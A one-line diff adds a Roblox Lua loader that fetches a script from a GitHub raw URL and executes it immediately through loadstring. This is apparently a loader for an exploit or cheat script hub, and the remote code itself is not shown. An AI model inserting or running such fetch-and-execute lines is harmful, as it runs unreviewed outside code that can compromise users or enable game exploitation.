@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Lobu9999/Main/refs/heads/main/lobu.lua')))()
